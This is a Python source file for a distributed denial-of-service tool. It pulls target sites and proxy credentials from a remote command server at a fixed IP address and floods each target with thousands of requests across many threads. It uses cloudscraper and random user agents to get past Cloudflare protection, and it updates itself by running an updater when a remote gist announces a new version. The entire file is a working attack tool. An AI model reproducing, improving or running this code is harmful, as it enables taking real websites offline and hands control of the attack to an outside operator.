import cloudscraper
import os
from urllib.parse import unquote
from gc import collect
from loguru import logger
from os import system
from sys import stderr
from threading import Thread
from random import choice
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from argparse import ArgumentParser
import platform

import json

VERSION = 6
HOSTS = ["http://46.4.63.238/api.php"]
MAX_REQUESTS = 5000
disable_warnings()


def clear():
    if platform.system() == "Linux":
        return system("clear")

    return system("cls")


logger.remove()
logger.add(
    stderr,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> "
    "| <cyan>{line}</cyan> - <white>{message}</white>",
)

parser = ArgumentParser()
parser.add_argument("n_threads", type=int)
parser.add_argument("target_sites", nargs="*")
parser.add_argument("-v", "--verbose", dest="verbose", action="store_true")
parser.add_argument("-n", "--no-clear", dest="no_clear", action="store_true")
args = parser.parse_args()
threads = int(args.n_threads)
verbose = args.verbose
no_clear = args.no_clear
specified_target_sites = args.target_sites


def checkReq():
    os.system("python3 -m pip install -r requirements.txt")
    os.system("python -m pip install -r requirements.txt")
    os.system("pip install -r requirements.txt")
    os.system("pip3 install -r requirements.txt")


def checkUpdate():
    print("Checking Updates...")
    updateScraper = cloudscraper.create_scraper(
        browser={"browser": "firefox", "platform": "android", "mobile": True},
    )
    url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
    try:
        content = updateScraper.get(url).content
        if content:
            data = json.loads(content)
            new_version = data["version"]
            print(new_version)
            if int(new_version) > int(VERSION):
                print("New version Available")
                os.system("python updater.py " + str(threads))
                os.system("python3 updater.py " + str(threads))
                exit()
        else:
            sleep(5)
            checkUpdate()
    except:
        sleep(5)
        checkUpdate()


def mainth():
    scraper = cloudscraper.create_scraper(
        browser={"browser": "firefox", "platform": "android", "mobile": True},
    )
    scraper.headers.update(
        {
            "Content-Type": "application/json",
            "cf-visitor": "https",
            "User-Agent": random_useragent(),
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ru",
            "x-forwarded-proto": "https",
            "Accept-Encoding": "gzip, deflate, br",
        }
    )

    while True:
        scraper = cloudscraper.create_scraper(
            browser={"browser": "firefox", "platform": "android", "mobile": True},
        )
        scraper.headers.update(
            {
                "Content-Type": "application/json",
                "cf-visitor": "https",
                "User-Agent": random_useragent(),
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "ru",
                "x-forwarded-proto": "https",
                "Accept-Encoding": "gzip, deflate, br",
            }
        )
        logger.info("GET RESOURCES FOR ATTACK")
        host = choice(HOSTS)
        content = scraper.get(host).content
        if content:
            try:
                data = json.loads(content)
            except json.decoder.JSONDecodeError:
                logger.info("Host {} has invalid format".format(host))
                sleep(5)
                continue
            except Exception as exc:
                logger.exception(f"Unexpected error: {exc}. Host {host}")
                sleep(5)
                continue
        else:
            sleep(5)
            continue
        if specified_target_sites:
            site = choice(specified_target_sites)
        else:
            site = unquote(data["site"]["page"])
        logger.info("STARTING ATTACK TO " + site)
        if not site.startswith("http"):
            site = "https://" + site

        attacks_number = 0

        try:
            if not verbose:
                print("Atacking", end="")

            attack = scraper.get(site)

            if attack.status_code >= 302:
                for proxy in data["proxy"]:
                    scraper.proxies.update(
                        {
                            "http": f'{proxy["ip"]}://{proxy["auth"]}',
                            "https": f'{proxy["ip"]}://{proxy["auth"]}',
                        }
                    )
                    response = scraper.get(site)
                    if response.status_code >= 200 and response.status_code <= 302:
                        for i in range(MAX_REQUESTS):
                            response = scraper.get(site)
                            attacks_number += 1
                            if verbose:
                                logger.info(
                                    "ATTACKED; RESPONSE CODE: "
                                    + str(response.status_code)
                                )
                            else:
                                print(".", end="")
            else:
                for i in range(MAX_REQUESTS):
                    response = scraper.get(site)
                    attacks_number += 1
                    if verbose:
                        logger.info(
                            "ATTACKED; RESPONSE CODE: " + str(response.status_code)
                        )
                    else:
                        print(".", end="")
            if attacks_number > 0:
                logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
        except Exception as exc:
            logger.warning(
                f"issue happened ({exc}), SUCCESSFUL ATTACKS: {attacks_number}"
            )
            continue


def cleaner():
    while True:
        sleep(60)
        checkUpdate()

        if not no_clear:
            clear()
        collect()


if __name__ == "__main__":
    if not no_clear:
        clear()
    checkReq()
    checkUpdate()
    for _ in range(threads):
        Thread(target=mainth).start()
    Thread(target=cleaner, daemon=True).start()
